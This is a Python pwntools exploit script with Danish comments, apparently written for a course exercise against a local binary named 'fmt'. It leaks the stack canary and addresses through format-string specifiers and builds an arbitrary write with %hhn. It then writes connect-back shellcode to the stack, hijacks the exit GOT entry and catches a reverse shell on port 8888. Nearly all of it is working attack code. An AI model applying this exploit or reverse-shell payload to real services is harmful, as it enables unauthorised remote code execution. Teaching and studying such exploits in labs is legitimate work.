#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

context(arch = "i386", os = "linux")

#%134 - Canary
#%136 - 12288 bytes into fmt
#%137 - 556 bytes further than buffer
#ret lies 528 bytes further than buffer
#%139 - Socket fd

r = remote("localhost", 20001)
r.recvuntil("How may I help you?\n")

#Nu kender vi positionerne og offsets på alt hvad vi vil vide, lad os leake dem
r.sendline(flat(
    "%134$08x",
    "%136$08x",
    "%137$08x",#ebp1
    "%139$08x",
    "%145$08x",#ebp2
    "%157$08x" #ebp3
    ))
line = r.recvline().rstrip()
canary = int(line[0:8], 16)
fmt_base = int(line[8:16], 16) - 12288
ebp1 = int(line[16:24], 16)
buffer = ebp1 - 556
ret = buffer + 528
socket_fd = int(line[24:32], 16)
ebp2 = int(line[32:40], 16)
ebp3 = int(line[40:48], 16)

print "Canary: 0x%08x" % canary
print "fmt is loaded at 0x%08x" % fmt_base
print "buffer is at 0x%08x" % buffer
print "return address is at 0x%08x" % ret
print "socket fd: %d" % socket_fd
print "ebp1: 0x%08x" % ebp1
print "ebp2: 0x%08x" % ebp2
print "ebp3: 0x%08x" % ebp3

def send_receive(d):
    r.sendline(d)
    return r.readline()

#Så laver vi en funktion som skaber en pointer
def make_pointer(addr):
    #Vi bruger ebp1 til at opdatere ebp2
    send_receive('A' * ((ebp2 & 0xff) + 0) + '%137$hhn')
    send_receive('A' * ((addr >> 0) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 1) + '%137$hhn')
    send_receive('A' * ((addr >> 8) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 2) + '%137$hhn')
    send_receive('A' * ((addr >> 16) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 3) + '%137$hhn')
    send_receive('A' * ((addr >> 24) & 0xff) + '%145$hhn')

#Vi skal udbygge med arbitrary write og bevise det ved at overskrive retur adressen
#Denne funktion skal skrive 'data' til 'addr'
def poke(addr, data):
    for i in range(len(data)):
        make_pointer(addr + i)
        send_receive('A' * ord(data[i]) + '%157$hhn')

#Det var faktisk dét. Vi laver et payload.
#Nu er read loopet lidt generende idet det kræver at vi sender 'exit' eller lukker forbindelsen før det afslutter
#Så vi benytter lejligheden til at vise et connectback payload

payload = asm(
            shellcraft.connect(util.net.interfaces4()['docker0'][0], 8888) +
            shellcraft.dupsh('edx')
        )

#pwntools har en klasse, ELF, som gør det nemmere at slå interessante ting op i ELF filer

#Når vi returnerer fra 'handle_client' så "frigives" bufferen.
#Dens indhold er intakt INDTIL en kaldt funktion overskriver den, og jeg har tjekket...det gør dprintf
#Så vi kan ikke længere placere payloadet i bufferen. Vi kan til gengæld ligge den på stakken efter den gemte
#ebp3
#ebp3 ligger på adressen som er gemt i ebp2 så vi placerer payloadet fire bytes højere end værdien af ebp2

payload_addr = ebp2 + 4
poke(payload_addr, payload)

#Nu ligger vores payload på 'payload_addr'
#Vi overskriver 'exit@glibc' GOT entrien med 'payload_addr' istedet for at overskrive retur adressen

#Vi har et payload. Vi starter med at overskrive retur adressen
e = ELF('assignments/fmt')
poke(fmt_base + e.got['exit'], p32(payload_addr))

#Så burde det virke

#Nu skal vi lave en listening tube
shell = listen(8888)
#Så lukker vi forbindelsen
r.close()
#...og venter på at en ny forbindelse dukker op
shell.wait_for_connection()
#...som vi burde have en shell på
shell.interactive()

#Og så det spændende øjeblik
